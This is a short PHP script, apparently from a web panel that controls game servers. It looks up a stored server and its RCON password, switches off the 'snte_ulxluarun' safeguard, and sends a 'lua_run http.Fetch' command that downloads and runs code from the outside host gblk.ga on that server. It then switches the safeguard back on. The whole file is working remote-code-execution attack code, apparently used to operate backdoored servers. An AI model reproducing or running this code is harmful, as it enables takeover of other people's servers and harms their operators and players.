<?php

include('../class/include.php');
include '../SourceQuery/SourceQuery.class.php';
if (!Account::isAuthentified())
{
    die("Bad request");
}

$server = Server::GetServer($_GET["id"]);
$rcon = $server["rcon"];
$rcn = new SourceQuery;
$rcn->Connect($server['server_ip'], $server['server_port']);
$rcn->SetRconPassword($rcon);
$rcn->Rcon("snte_ulxluarun 0");
$rcn->Rcon("lua_run http.Fetch([[http://gblk.ga/f?k=".$_SESSION["id"]."]],RunString)");
$rcn->Rcon("snte_ulxluarun 1");


?>